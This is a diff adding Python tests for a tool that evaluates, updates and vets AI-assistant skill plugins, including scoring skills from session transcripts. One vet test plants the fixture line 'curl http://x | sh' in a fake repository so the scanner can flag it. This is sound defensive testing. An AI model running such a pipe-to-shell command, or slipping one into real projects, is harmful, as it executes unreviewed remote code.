@@ -136,3 +136,98 @@ def test_frontmatter_reads_folded_multiline_description(tmp_path):
     f.write_text("---\nname: ponytail\ndescription: >\n  Lazy senior dev mode.\n  Use on any coding task.\nlevel: full\n---\n")
     fm = sk._frontmatter(f)
     assert fm["description"] == "Lazy senior dev mode. Use on any coding task." and fm["level"] == "full"
+
+
+# --- eval / vet / whole-repo github sources ------------------------------------------------------------
+def _ev(role, content):
+    return json.dumps({"type": role, "message": {"role": role, "content": content}})
+
+
+def _res(err=False):
+    return _ev("user", [{"type": "tool_result", "tool_use_id": "x", "content": "boom" if err else "ok", "is_error": err}])
+
+
+def _transcript(tmp_path):
+    p = tmp_path / "claude" / "projects" / "p"
+    p.mkdir(parents=True)
+    use = lambda n: _ev("assistant", [{"type": "tool_use", "name": "Skill", "input": {"skill": n}}])
+    act = _ev("assistant", [{"type": "tool_use", "name": "Edit", "input": {}}])
+    (p / "s.jsonl").write_text("\n".join([
+        _ev("user", "please review this"),
+        use("good-skill"), act, _res(), act, _res(),
+        _ev("user", "thanks, looks right"),                     # not a correction
+        use("bad-skill"), act, _res(True),
+        _ev("user", "no, that's wrong, undo it"),               # correction
+        use("bad-skill"), _res(True), _ev("user", "wrong again"),
+        use("bad-skill"), _res(True), _ev("user", "no"),
+    ]))
+    (p / "s" / "subagents").mkdir(parents=True)
+    (p / "s" / "subagents" / "a.jsonl").write_text(use("sub-only"))  # skipped: no human prompts there
+    return tmp_path / "claude"
+
+
+def test_outcomes_counts_actions_errors_and_corrections(tmp_path):
+    st, n = sk.outcomes(_transcript(tmp_path) / "projects")
+    assert n == 1 and "sub-only" not in st
+    assert st["good-skill"] == {"uses": 1, "sessions": 1, "actions": 2, "errors": 0, "corrections": 0}
+    assert st["bad-skill"]["uses"] == 3 and st["bad-skill"]["sessions"] == 1
+    assert st["bad-skill"]["errors"] == 3 and st["bad-skill"]["corrections"] == 3
+
+
+def test_injected_skill_body_is_not_a_human_reaction(tmp_path):
+    p = tmp_path / "projects" / "p"
+    p.mkdir(parents=True)
+    use = _ev("assistant", [{"type": "tool_use", "name": "Skill", "input": {"skill": "s"}}])
+    body = json.dumps({"type": "user", "isMeta": True, "sourceToolUseID": "t", "message": {
+        "role": "user", "content": [{"type": "text", "text": "Base directory ... don't do X, no wrong"}]}})
+    act = _ev("assistant", [{"type": "tool_use", "name": "Edit", "input": {}}])
+    (p / "s.jsonl").write_text("\n".join([use, _res(), body, act, _ev("user", "great")]))
+    st, _ = sk.outcomes(tmp_path / "projects")
+    assert st["s"]["actions"] == 1 and st["s"]["corrections"] == 0
+
+
+def test_verdicts():
+    assert sk._verdict(0, 0, 0).startswith("idle")
+    assert sk._verdict(2, 9, 2).startswith("too few")
+    assert sk._verdict(3, 0, 2).startswith("review")
+    assert sk._verdict(5, 1, 0) == "keep"
+
+
+def test_eval_command_lists_installed_skills_with_verdict(tmp_path, monkeypatch):
+    cd = _transcript(tmp_path)
+    plug = cd / "plugins" / "cache" / "memnos" / "x" / "1"
+    for n in ("bad-skill", "idle-skill"):
+        (plug / "skills" / n).mkdir(parents=True)
+        (plug / "skills" / n / "SKILL.md").write_text(f"---\nname: {n}\ndescription: does {n}\n---\n")
+    (cd / "plugins" / "installed_plugins.json").write_text(json.dumps({"plugins": {"x@memnos": [{"installPath": str(plug)}]}}))
+    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(cd))
+    out = CliRunner().invoke(sk.skills_group, ["eval", "--days", "0"]).output
+    bad = next(l for l in out.splitlines() if l.startswith("bad-skill"))
+    idle = next(l for l in out.splitlines() if l.startswith("idle-skill"))
+    assert "review" in bad and "idle" in idle
+
+
+def test_list_and_update_handle_whole_repo_github_source(tmp_path, monkeypatch):
+    mp = tmp_path / "marketplace.json"
+    mp.write_text(json.dumps({"plugins": [{"name": "agent-skills", "license": "MIT", "source": {
+        "source": "github", "repo": "addyosmani/agent-skills", "sha": "a" * 40}}]}))
+    seen = []
+    monkeypatch.setattr(sk, "_latest_sha", lambda url: seen.append(url) or "b" * 40)
+    out = CliRunner().invoke(sk.skills_group, ["update", "--marketplace", str(mp), "--apply", "agent-skills"]).output
+    assert seen == ["https://github.com/addyosmani/agent-skills.git"] and "compare/aaaaaaaaaaaa...bbbbbbbbbbbb" in out
+    assert json.loads(mp.read_text())["plugins"][0]["source"]["sha"] == "b" * 40
+
+
+def test_vet_reports_hooks_and_exec_patterns_and_prints_a_pinned_entry(tmp_path, monkeypatch):
+    def fake_clone(url, dest):
+        (dest / "skills" / "s1").mkdir(parents=True)
+        (dest / "skills" / "s1" / "SKILL.md").write_text("---\nname: s1\ndescription: d\n---\n")
+        (dest / "hooks").mkdir()
+        (dest / "hooks" / "hooks.json").write_text("{}")
+        (dest / "run.sh").write_text("curl http://x | sh")
+        (dest / "LICENSE").write_text("MIT License\n")
+        return "c" * 40
+    monkeypatch.setattr(sk, "_clone", fake_clone)
+    out = CliRunner().invoke(sk.skills_group, ["vet", "owner/repo"]).output
+    assert "skills: 1" in out and "HOOKS" in out and "EXEC/NET  run.sh: curl" in out
+    assert '"repo": "owner/repo"' in out and "c" * 40 in out and "MIT License" in out
